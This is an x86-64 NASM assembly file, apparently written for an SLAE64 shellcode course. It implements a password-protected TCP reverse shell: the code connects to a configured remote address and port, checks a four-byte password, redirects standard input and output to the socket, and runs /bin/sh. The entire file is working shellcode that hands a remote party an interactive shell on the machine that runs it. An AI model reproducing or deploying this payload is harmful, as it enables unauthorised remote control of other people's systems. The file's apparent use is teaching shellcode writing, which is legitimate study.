; Filename: ReverseShellTcp.nasm
; Author:  SLAE64 - 1525
;
; Purpose: spawn /bin/sh on reverse connect
BITS 64

global _start			

section .text

; settings
PASSWORD equ 'abcd'
PORT equ 0x050d ; default 3333
REMOTE_IP equ 0x0101017f

; syscall kernel opcodes
SYS_SOCKET equ 0x29
SYS_CONNECT equ 0x2a
SYS_DUP2 equ 0x21
SYS_EXECVE equ 0x3b
SYS_RECVMMSG equ 0x151
SYS_EXIT equ 0x3C

; syscall constants
AF_INET equ 0x2
SOCK_STREAM equ 0x1
IPPROTO_TCP equ 0x6

_start:

    xor r10, r10 ; general null

create_socket:
    ; Socket
    ;   RAX       RAX    RDI       RSI           RDX
    ; soc_des = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    push SYS_SOCKET
    pop rax
    push AF_INET
    pop rdi
    push SOCK_STREAM
    pop rsi
    push IPPROTO_TCP
    pop rdx
    syscall 
    
    mov rdi, rax ; save socket descriptor in rdi

struct_sockaddr:  
    ; server.sin_family = AF_INET 
    ; server.sin_port = htons(PORT)
    ; server.sin_addr.s_addr = inet_addr("127.0.0.1")
    ; bzero(&server.sin_zero, 8)

    mov dword [rsp-4], REMOTE_IP ;INADDR_ANY
    mov word  [rsp-6], PORT ; htons(3333) -> word = 2bytes
    mov byte  [rsp-8], AF_INET ; AF_INET -> word = 2bytes
    sub rsp, 0x8

    mov rsi, rsp ; rsi = &sockaddr

connect:
    ;    rax  rdi           rsi              rdx 
    ; connect(s, (struct sockaddr *)&sa, sizeof(sa));
    
    push SYS_CONNECT
    pop rax
    
    ; rdi already setup
    ; rsi already setup

    push 0x10
    pop rdx
    
    syscall

password_check:

    push rsp
    pop rsi ; rsi = &buf (char*)
    push 0x10 ; rdx = 0x10, >=8 bytes
    pop rdx
                                    
    xor eax, eax ; SYS_READ = 0x0
    syscall

    cmp dword [rsp], PASSWORD ; simple comparison
    jne parent_or_error ; bad pw, abort

dup2:
    ; rax    rdi   rsi 
    ; dup2(soc_cli,0); // standard input
    push SYS_DUP2
    pop rax
    push r10
    pop rsi

    syscall

    ; rax    rdi   rsi 
    ; dup2(soc_cli,1); // standard output
    push SYS_DUP2
    pop rax
    push 1
    pop rsi

    syscall

    ; rax    rdi   rsi 
    ; dup2(soc_cli,2); // standard error
    push SYS_DUP2
    pop rax
    push 2
    pop rsi

    syscall

exec_shell:
    ; rax      rdi     rsi    rdx
    ; execl("/bin/sh","sh",(char *)0);

    xor rsi, rsi ; *argv[] = 0

    push rsi ; '\0'
    mov rdi, 0x68732f2f6e69622f ; hs//bin/
    push rdi ; str        
    mov rdi, rsp  ; rdi = &str (char*)

    push rsi
    mov rdx, rsp ; *envp[] = 0

    push rdi 
    mov rsi, rsp

    push byte SYS_EXECVE
    pop rax
    syscall

parent_or_error:
    ;  rax
    ; exit()
    push SYS_EXIT
    pop rax

    syscall